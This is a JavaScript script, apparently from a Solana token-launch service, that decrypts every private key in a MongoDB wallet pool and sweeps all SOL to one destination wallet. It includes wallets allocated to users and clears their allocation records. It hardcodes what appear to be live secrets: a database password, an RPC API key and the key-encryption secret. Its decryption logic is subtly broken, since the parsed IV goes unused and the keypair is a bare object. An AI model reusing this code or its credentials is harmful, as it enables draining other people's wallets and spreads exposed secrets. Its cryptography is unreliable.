import mongoose from 'mongoose';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import crypto from 'crypto';

// Configuration
const MONGODB_URI = "mongodb+srv://nitro-launch:LFJ7WFVPyKIKKspK@bundler.bladbsz.mongodb.net/nitro_launch";
const RPC_ENDPOINT = 'https://mainnet.helius-rpc.com/?api-key=74feaea1-f5ce-4ef6-a124-49dd51e76f67';

// Encryption secret
const ENCRYPTION_SECRET = '294f6d574446132dcb92d050612dea7aa8cdfe918f29adc9681e1cdf75ad42bb';

// Destination wallet (you'll need to provide this)
const DESTINATION_WALLET = 'YOUR_DESTINATION_WALLET_ADDRESS'; // Replace with your wallet address

// Define wallet pool schema
const walletPoolSchema = new mongoose.Schema({
    publicKey: { type: String, required: true, unique: true },
    privateKey: { type: String, required: true },
    isAllocated: { type: Boolean, default: false },
    allocatedTo: { type: mongoose.Schema.Types.ObjectId, ref: "User", default: null },
    allocatedAt: { type: Date, default: null },
    createdAt: { type: Date, default: Date.now },
}, { timestamps: true });

const WalletPoolModel = mongoose.model('WalletPool', walletPoolSchema);

// Sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function decryptPrivateKey(encryptedKey, secret) {
    try {
        const key = Buffer.from(secret, 'hex');
        const iv = Buffer.from(encryptedKey.slice(0, 32), 'hex');
        const encryptedData = Buffer.from(encryptedKey.slice(32), 'hex');
        
        const decipher = crypto.createDecipher('aes-256-cbc', key);
        decipher.setAutoPadding(false);
        
        let decrypted = decipher.update(encryptedData);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        
        // Remove PKCS7 padding
        const paddingLength = decrypted[decrypted.length - 1];
        decrypted = decrypted.slice(0, decrypted.length - paddingLength);
        
        return decrypted;
    } catch (error) {
        console.error('Decryption error:', error.message);
        return null;
    }
}

async function getWalletBalance(connection, publicKey) {
    try {
        const balance = await connection.getBalance(publicKey);
        return balance / LAMPORTS_PER_SOL;
    } catch (error) {
        console.error(`Error getting balance for ${publicKey.toString()}:`, error.message);
        return 0;
    }
}

async function transferSol(connection, fromKeypair, toAddress, amount) {
    try {
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: fromKeypair.publicKey,
                toPubkey: new PublicKey(toAddress),
                lamports: Math.floor(amount * LAMPORTS_PER_SOL)
            })
        );

        const signature = await connection.sendTransaction(transaction, [fromKeypair]);
        console.log(`Transaction sent: ${signature}`);
        
        // Wait for confirmation
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        if (confirmation.value.err) {
            throw new Error(`Transaction failed: ${confirmation.value.err}`);
        }
        
        return signature;
    } catch (error) {
        console.error('Transfer error:', error.message);
        return null;
    }
}

async function recoverAllStuckSol() {
    const connection = new Connection(RPC_ENDPOINT, 'confirmed');
    
    try {
        await mongoose.connect(MONGODB_URI);
        console.log('Connected to MongoDB');
        
        // Get all wallets from the wallet pool
        const wallets = await WalletPoolModel.find({}).lean();
        console.log(`Found ${wallets.length} total wallets in database`);
        
        let totalRecovered = 0;
        let successfulTransfers = 0;
        let failedTransfers = 0;
        let processedCount = 0;
        
        for (const wallet of wallets) {
            try {
                processedCount++;
                if (processedCount % 100 === 0) {
                    console.log(`Processed ${processedCount}/${wallets.length} wallets...`);
                }
                
                const publicKey = new PublicKey(wallet.publicKey);
                const balance = await getWalletBalance(connection, publicKey);
                
                if (balance > 0.001) { // Only transfer if balance is more than 0.001 SOL (to cover fees)
                    console.log(`\nProcessing wallet ${wallet.publicKey}:`);
                    console.log(`  Balance: ${balance} SOL`);
                    console.log(`  Allocated: ${wallet.isAllocated}`);
                    console.log(`  Allocated to: ${wallet.allocatedTo || 'None'}`);
                    
                    // Decrypt private key
                    const privateKeyBytes = decryptPrivateKey(wallet.privateKey, ENCRYPTION_SECRET);
                    if (!privateKeyBytes) {
                        console.log(`  ❌ Failed to decrypt private key`);
                        failedTransfers++;
                        continue;
                    }
                    
                    const keypair = {
                        publicKey,
                        secretKey: privateKeyBytes
                    };
                    
                    // Calculate transfer amount (leave some for fees)
                    const transferAmount = balance - 0.001;
                    
                    if (transferAmount > 0) {
                        console.log(`  Transferring ${transferAmount} SOL to destination...`);
                        
                        const signature = await transferSol(connection, keypair, DESTINATION_WALLET, transferAmount);
                        
                        if (signature) {
                            console.log(`  ✅ Successfully transferred ${transferAmount} SOL`);
                            console.log(`  Transaction: ${signature}`);
                            
                            // Update wallet status in database
                            await WalletPoolModel.updateOne(
                                { _id: wallet._id },
                                { 
                                    $set: { 
                                        isAllocated: false,
                                        allocatedTo: null,
                                        allocatedAt: null
                                    }
                                }
                            );
                            
                            totalRecovered += transferAmount;
                            successfulTransfers++;
                        } else {
                            console.log(`  ❌ Transfer failed`);
                            failedTransfers++;
                        }
                    } else {
                        console.log(`  ⚠️  Balance too low to transfer (${balance} SOL)`);
                    }
                }
                
                // Add small delay to avoid rate limiting
                await sleep(100);
                
            } catch (error) {
                console.error(`Error processing wallet ${wallet.publicKey}:`, error.message);
                failedTransfers++;
            }
        }
        
        console.log('\n=== RECOVERY SUMMARY ===');
        console.log(`Total SOL recovered: ${totalRecovered.toFixed(6)} SOL`);
        console.log(`Successful transfers: ${successfulTransfers}`);
        console.log(`Failed transfers: ${failedTransfers}`);
        console.log(`Destination wallet: ${DESTINATION_WALLET}`);
        
    } catch (error) {
        console.error('Error:', error);
    } finally {
        await mongoose.disconnect();
        process.exit(0);
    }
}

// Check if destination wallet is provided
if (DESTINATION_WALLET === 'YOUR_DESTINATION_WALLET_ADDRESS') {
    console.error('❌ Please set DESTINATION_WALLET to your wallet address');
    process.exit(1);
}

console.log('🚀 Starting comprehensive SOL recovery from all mixer wallets...');
console.log(`Destination: ${DESTINATION_WALLET}`);
recoverAllStuckSol().catch(console.error); 